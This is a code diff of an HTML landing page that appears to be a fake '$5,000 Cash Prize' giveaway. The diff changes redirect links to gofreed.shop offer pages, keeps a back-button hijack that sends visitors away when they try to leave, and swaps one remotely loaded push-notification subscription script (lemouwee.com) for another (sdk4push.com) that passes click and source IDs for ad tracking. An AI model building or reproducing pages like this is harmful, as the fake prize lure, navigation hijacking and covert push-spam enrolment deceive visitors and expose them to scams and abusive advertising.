@@ -28,11 +28,11 @@
         }
             , "", "");
         window.onpopstate = function (event) {
-            window.location.href = 'https://get.gofreed.shop/click?key=94c5542b570b35bb9c84';
+            window.location.href = 'http://peer.gofreed.shop/c66c4f5a-8506-40e6-983d-3068d73fd4f6?';
         };
 
         function openWindows() {
-            window.location.href = 'https://get.gofreed.shop/click?lp=1';
+            window.location.href = 'http://peer.gofreed.shop/offer';
             return false; // 可选：阻止默认行为和事件冒泡
         }
     </script>
@@ -95,7 +95,7 @@
                                 <td style="padding:10px 5px 10px 0;text-align:center"><img src="img/prize.png"
                                         style="max-height:120px">
                                 <td style="line-height:1.6">
-                                    <p style="text-align:left"><a onclick="openWindows()" 
+                                    <p style="text-align:left"><a onclick="openWindows()"
                                             style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false"
                                             rel=noreferrer><span class="name">$5,000 Cash Prize
                                             </span></a></p>
@@ -107,9 +107,8 @@
                                             <script>document.write(getURLParameter("yp"));</script>$0
                                         </span></p>
                                     <p class="remaining"><b>Available: <span>1</span></b></p>
-                                    <div><a class="button" onclick="openWindows()" 
-                                            style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false"
-                                            rel=noreferrer> Choose </a></div>
+                                    <div><a class="button" onclick="openWindows()" style="cursor:pointer!important"
+                                            onclick="exit_a1();PreventExitPop=false" rel=noreferrer> Choose </a></div>
                         </tbody>
                     </table>
                 </div>
@@ -343,21 +342,27 @@
             document.getElementById("hsecs").textContent = h;
         };
     </script>
- <script>
-    var s = document.createElement('script');
-    s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=7510819'+'&sw=/sw-check-permissions-ecbf4.js';
-    s.onload = function(result) {
-        switch (result) {
-            case 'onPermissionDefault':break;
-            case 'onPermissionAllowed':break;
-            case 'onPermissionDenied':break;
-            case 'onAlreadySubscribed':break;
-            case 'onNotificationUnsupported':break;
-        }
-    };
-    document.head.appendChild(s);
-</script>
+    <script async data-cfasync="false">
+        (function () {
+            const url = new URL(window.location.href);
+            const clickID = url.searchParams.get("click_id");
+            const sourceID = url.searchParams.get("source_id");
 
+            const s = document.createElement("script");
+            s.dataset.cfasync = "false";
+            s.src = "https://sdk4push.com/f/sdk.js?z=1213743";
+            s.onload = (opts) => {
+                opts.zoneID = 1213743;
+                opts.extClickID = clickID;
+                opts.subID1 = sourceID;
+                opts.actions.onPermissionGranted = () => { };
+                opts.actions.onPermissionDenied = () => { };
+                opts.actions.onAlreadySubscribed = () => { };
+                opts.actions.onError = () => { };
+            };
+            document.head.appendChild(s);
+        })()
+    </script>
 
 </body>
 
